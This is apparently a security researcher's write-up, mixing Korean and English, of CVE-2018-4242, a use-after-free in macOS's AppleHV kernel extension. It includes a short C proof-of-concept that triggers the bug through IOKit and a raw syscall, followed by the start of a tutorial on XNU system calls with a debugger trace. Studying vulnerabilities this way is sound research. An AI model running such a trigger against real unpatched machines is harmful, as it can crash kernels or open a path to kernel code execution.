
# Look at The XNU Through A Tube CVE-2018-4242 Write-up

Zhuo Liang of Qihoo 360 Nirvan Team

## Contents
## 1 Introduction 1
> #### 1.1 CVE-2018-4242 . . . . . . . . . . . . . . . . . . . . . . . . . 1

## 2 The XNU Kernel 2
> ####	2.1 System Call . . . . . . . . . . . . . . . . . . . . . . . . . . 2
> ####	2.2 MIG . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6
> ####	2.2.1 mach_msg And Mach port . . . . . . . . . . . . . . . . . 6
> ####	2.2.2 MIG: RPC Interfaces Generator . . . . . . . . . . . . . 8
> ####	2.3 IOKit . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11
> ####  2.3.1 IOUserClient . . . . . . . . . . . . . . . . . . . . . . . 12

## 3 AppleHV 12
> #### 3.1 Reverse Engineering . . . . . . . . . . . . . . . . . . . . . . 12
> #### 3.2 Vulnerability . . . . . . . . . . . . . . . . . . . . . . . . . 16
> #### 3.3 Fixing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17

## 4 Conclusion 17
  
  
  
  
## 1 Introduction

> ### 1.1 CVE-2018-4242

애플은 지난 주 3월에 보고된 CVE-2018-4242에 대한 [macOs 10.13.4 보안 업데이트](https://support.apple.com/en-us/HT208849)를 발표 했습니다. 해당 CVE-2018-4242는 커널 권한으로 임의의 코드를 실행함으로써 악성 프로그램에 노출될 수 있는 취약점입니다. 이 보고서는 이 문제를 통해서 [XNU](https://en.wikipedia.org/wiki/XNU)를 살펴 보는데 도움이 될 것입니다.
Listing 1의 코드는 우리가 시연한 POC입니다. 전체 소스코드는  [github](https://github.com/brightiup/research/blob/master/macOS/CVE-2018-4242/AppleHVUaF.c)에서 다운로드할 수 있습니다.

```c
1 // AppleHVUaF.c
2 void destroy_vm() {
3   asm("mov $0x03000000, %rax; mov $0x04, %rdi; syscall");
4   return;
5 }
6 int main(int argc, char **argv) {
7   const char *service_name = "AppleHV";
8   io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(service_name));
9
10  if (service == MACH_PORT_NULL) {
11    printf("[−] Cannot get matching service of %s\n", service_name);
12    return 0;
13  }
14  printf("[+] Get matching service of %s succeed, service=0x%x\n", service_name, service);
15
16  io_connect_t client = MACH_PORT_NULL;
17  kern_return_t ret = IOServiceOpen(service, mach_task_self(), 0, &client);
18  if (ret != KERN_SUCCESS) {
19    printf("[−] Open service of %s failed!\n", service_name);
20    return 0;
21  }
22  printf("[+] Create IOUserClient of %s succeed, client=0x%x\n",
23  service_name, client);
24  IOServiceClose(client);
25  usleep(5);
26  destroy_vm();
27  return 0;
28 }
```
​							Listing 1: CVE-2018-4242에 대한 PoC

이 코드를 이해하려면 XNU에 대한 몇 가지 기본 지식이 필요합니다. XNU를 처음 접하는 독자를 위해 2절에서는 XNU에 대한 내용을 다룰것 입니다. 이미 아래 항목들을 알고 있다면 3절로 부터 보셔도 됩니다.
  * Classes of system calls in XNU
  * MIG aka RPC interfaces generator in XNU
  * IOKit subsystem

Section 1 Introduction  
Section 2 Basic knowledges of XNU  
Section 3 Reverse of AppleHV.kext and details of CVE-2018-4242  
Section 4 Conclusion  

# 2 The XNU Kernel

## 2.1 System Call
As we all know, system call in computing is a way for programs to
interact with the operating system. The user-level processes can request
services of the operating system through a system call. In XNU, there are
four classes of system call which powers all the user-kernel interacting.
Let’s delve into these through the syscall instruction as shown in Listing
1.
​	syscall on x86_64 architecture is the kind of instruction which can
invoke an OS system call handler in kernel space. Listing 2 illustrates
how syscall works through a simple write example.

```c
~ cat write.c
2 #include 
3 int main() {
4 write(0, "Hello\n", 6);
5 return 0;
6 }
7 ~ clang write.c −o write
8 ~ lldb write
9 (lldbinit) b libsystem_kernel.dylib`write
10 Breakpoint 1: where = libsystem_kernel.dylib`write, address = 0x000000000001e6f8
11 (lldbinit) r
12 −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−[regs]
13 RAX: 0x0000000000000006 RBX: 0x0000000000000000 RBP: 0x00007FFEEFBFF8D0
14 RSP: 0x00007FFEEFBFF8B8 RDI: 0x0000000000000000 RSI: 0x0000000100000FA2
15 RDX: 0x0000000000000006 RCX: 0x00007FFEEFBFF9F8 RIP: 0x00007FFF7ED096F8
16 R8: 0x0000000000000000 R9: 0xFFFFFFFF00000000 R10: 0x00007FFEEFBFFA48
17 R11: 0x00007FFF7ED096F8 R12: 0x0000000000000000 R13: 0x0000000000000000
18 R14: 0x0000000000000000 R15: 0x0000000000000000
19 CS: 002B FS: 0000 GS: 0000
20 −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−[code]
21 write @ libsystem_kernel.dylib:
22 −> 0x7fff7ed096f8: b8 04 00 00 02 mov eax, 0x2000004
23 0x7fff7ed096fd: 49 89 ca mov r10, rcx
24 0x7fff7ed09700: 0f 05 syscall
25 0x7fff7ed09702: 73 08 jae 0x7fff7ed0970c ; <+20>
26 0x7fff7ed09704: 48 89 c7 mov rdi, rax
27 0x7fff7ed09707: e9 19 54 ff ff jmp 0x7fff7ecfeb25 ; cerror
28 0x7fff7ed0970c: c3 ret
29 0x7fff7ed0970d: 90 nop
30 (lldbinit) x/s rsi
31 0x100000fa2: "Hello\n"
```
​								Listing 2: Simple write example
